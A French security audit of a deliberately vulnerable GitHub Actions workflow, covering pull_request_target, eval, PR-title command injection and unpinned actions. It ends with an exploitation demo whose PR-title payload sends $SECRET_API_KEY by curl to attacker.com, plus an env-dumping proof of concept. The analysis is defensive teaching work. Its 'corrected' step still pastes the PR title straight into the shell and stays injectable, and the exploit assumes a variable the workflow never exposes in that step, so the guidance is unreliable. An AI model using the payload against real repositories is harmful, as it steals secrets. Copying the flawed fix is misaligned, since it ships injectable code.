# Analyse des Mauvaises Pratiques de Sécurité dans le Workflow GitHub Actions

## 1. Configuration du Déclencheur (Trigger)
### Problème
```yaml
on:
  pull_request_target:
    branches: [ main ]
```
- Utilisation de `pull_request_target` sans restrictions sur les branches source
- Permet l'exécution du workflow pour des PRs provenant de n'importe quel fork
- Donne accès aux secrets du dépôt cible aux PRs externes

### Impact
- Risque d'exécution de code malveillant depuis des forks non vérifiés
- Exposition potentielle des secrets du dépôt principal

## 2. Gestion des Secrets
### Problème
```yaml
- name: Secret
  env:
    SECRET_API_KEY: ${{ secrets.API_KEY }}
  run: echo "Secret loaded"
```
- Le secret est chargé dans une variable d'environnement
- Utilisation de `echo` qui peut exposer le secret dans les logs
- Absence de masquage des secrets dans les logs

### Impact
- Exposition potentielle des secrets dans les logs du workflow
- Risque d'exfiltration des secrets par des attaquants

## 3. Exécution de Commandes Non Sécurisées
### Problème
```yaml
- name: Execute command
  run: |
    echo "Running eval simulation..."
    eval "$INPUT_COMMAND"
```
- Utilisation de `eval` sur une entrée non validée
- Permet l'exécution de commandes arbitraires
- Absence de validation des entrées

### Impact
- Injection de commande possible
- Exécution de code malveillant
- Compromission potentielle du runner

## 4. Exécution Non Sécurisée du Titre de PR
### Problème
```yaml
- name: Title
  run: |
    echo "Titre PR : ${{ github.event.pull_request.title }}"
    bash -c "${{ github.event.pull_request.title }}"
```
- Exécution directe du titre de PR comme commande bash
- Absence de validation ou d'échappement
- Permet l'injection de commandes via le titre de PR

### Impact
- Injection de commande via le titre de PR
- Exécution de code arbitraire
- Compromission du pipeline CI/CD

## 5. Gestion des Actions
### Problème
```yaml
- name: Checkout repository
  uses: actions/checkout@v2
```
- Utilisation de versions non spécifiques d'actions
- Absence de vérification d'intégrité (checksum)
- Risque d'utilisation d'actions malveillantes

### Impact
- Possible compromission via des actions malveillantes
- Manque de reproductibilité du pipeline

## 6. Absence de Restrictions de Permissions
### Problème
- Pas de configuration `permissions` dans le workflow
- Utilisation des permissions par défaut qui sont trop larges

### Impact
- Accès excessif aux ressources du dépôt
- Risque d'actions non autorisées

## 7. Exécution de Scripts sans Vérification
### Problème
```yaml
- name: Run script
  run: python code_vuln.py
```
- Exécution directe de scripts sans vérification
- Absence de validation du contenu des scripts
- Pas de vérification d'intégrité

### Impact
- Exécution potentielle de code malveillant
- Compromission du pipeline CI/CD

## Recommandations Générales
1. Utiliser des versions spécifiques pour toutes les actions
2. Implémenter une validation stricte des entrées
3. Restreindre les permissions du workflow
4. Éviter l'utilisation de `eval` et `bash -c`
5. Masquer les secrets dans les logs
6. Utiliser des branches protégées
7. Implémenter des revues de code obligatoires
8. Configurer des limites de temps d'exécution
9. Utiliser des environnements isolés
10. Mettre en place des audits de sécurité réguliers

## Implications de Sécurité

### 1. Compromission du Pipeline CI/CD
#### Risques
- Exécution de code malveillant dans le pipeline
- Accès non autorisé aux ressources du dépôt
- Modification non autorisée des artefacts de build
- Injection de backdoors dans les builds

#### Impact Business
- Compromission de l'intégrité des builds
- Distribution de logiciels malveillants
- Perte de confiance des utilisateurs
- Impact sur la réputation de l'entreprise

### 2. Exposition des Secrets
#### Risques
- Fuite de clés API et tokens
- Accès non autorisé aux services externes
- Compromission des comptes associés
- Accès aux données sensibles

#### Impact Business
- Coûts de rotation des secrets
- Risques de conformité (RGPD, etc.)
- Responsabilité légale
- Perte de propriété intellectuelle

### 3. Attaques par Injection
#### Risques
- Injection de commandes via les titres de PR
- Exécution de code arbitraire via `eval`
- Manipulation des variables d'environnement
- Accès au système hôte

#### Impact Technique
- Compromission du runner GitHub Actions
- Accès au réseau interne
- Escalade de privilèges
- Persistance de l'attaque

### 4. Compromission de la Chaîne d'Approvisionnement
#### Risques
- Utilisation d'actions malveillantes
- Injection de dépendances compromises
- Modification des artefacts de build
- Distribution de logiciels malveillants

#### Impact sur la Sécurité
- Compromission en amont de la chaîne
- Difficulté de détection
- Propagation à grande échelle
- Temps de réponse prolongé

### 5. Implications Juridiques et de Conformité
#### Risques
- Non-conformité aux réglementations
- Violation des politiques de sécurité
- Responsabilité en cas de fuite de données
- Sanctions réglementaires

#### Impact Organisationnel
- Amendes et pénalités
- Perte de certifications
- Impact sur les contrats clients
- Obligations de notification

### 6. Impact sur la Continuité des Opérations
#### Risques
- Interruption des pipelines de livraison
- Compromission des environnements de production
- Perte de disponibilité des services
- Dégradation des performances

#### Impact Opérationnel
- Temps d'arrêt des services
- Coûts de récupération
- Perte de productivité
- Impact sur les délais de livraison

### 7. Implications sur la Gestion des Incidents
#### Risques
- Difficulté de détection des compromissions
- Temps de réponse prolongé
- Complexité de l'investigation
- Manque de visibilité sur l'étendue

#### Impact sur la Sécurité
- Augmentation du temps de compromission
- Difficulté de confinement
- Coûts d'investigation élevés
- Impact sur la capacité de réponse

## Démonstration d'Exploitation : Obtention du Secret

### Vulnérabilité Exploitée
La vulnérabilité se trouve dans l'étape "Title" du workflow qui exécute directement le titre de la PR comme une commande bash :
```yaml
- name: Title
  run: |
    echo "Titre PR : ${{ github.event.pull_request.title }}"
    bash -c "${{ github.event.pull_request.title }}"
```

### Méthode d'Exploitation
1. **Création d'une Pull Request Malveillante**
   - Créer un fork du dépôt
   - Créer une nouvelle branche
   - Créer une PR avec un titre contenant une commande malveillante

2. **Commande d'Exploitation**
   Le titre de la PR pourrait être :
   ```
   echo $SECRET_API_KEY > secret.txt && curl -X POST -d @secret.txt https://attacker.com/exfil
   ```
   Cette commande :
   - Accède à la variable d'environnement contenant le secret
   - Écrit le secret dans un fichier
   - Envoie le contenu du fichier à un serveur contrôlé par l'attaquant

3. **Exécution du Workflow**
   - Le workflow s'exécute automatiquement sur la PR
   - La commande malveillante est exécutée avec les permissions du workflow
   - Le secret est exfiltré vers le serveur de l'attaquant

### Preuve de Concept
Pour démontrer cette exploitation, on pourrait :
1. Créer une PR avec le titre :
   ```
   cat $GITHUB_ENV && env | grep -i secret
   ```
   Cette commande afficherait :
   - Le contenu du fichier d'environnement GitHub
   - Toutes les variables d'environnement contenant "secret"

### Impact Réel
- Le secret `API_KEY` serait exposé
- L'attaquant pourrait utiliser ce secret pour :
  - Accéder aux services protégés par l'API
  - Effectuer des actions non autorisées
  - Compromettre d'autres systèmes

### Mesures de Protection
Pour prévenir cette exploitation :
1. Ne jamais exécuter directement le titre de PR
2. Valider et échapper toutes les entrées utilisateur
3. Utiliser des expressions conditionnelles pour limiter l'exécution
4. Implémenter des revues de code obligatoires
5. Configurer des branches protégées

### Exemple de Correction
```yaml
- name: Title
  run: |
    # Validation du titre
    if [[ "${{ github.event.pull_request.title }}" =~ ^[a-zA-Z0-9\s\-_]+$ ]]; then
      echo "Titre valide : ${{ github.event.pull_request.title }}"
    else
      echo "Titre invalide"
      exit 1
    fi
``` 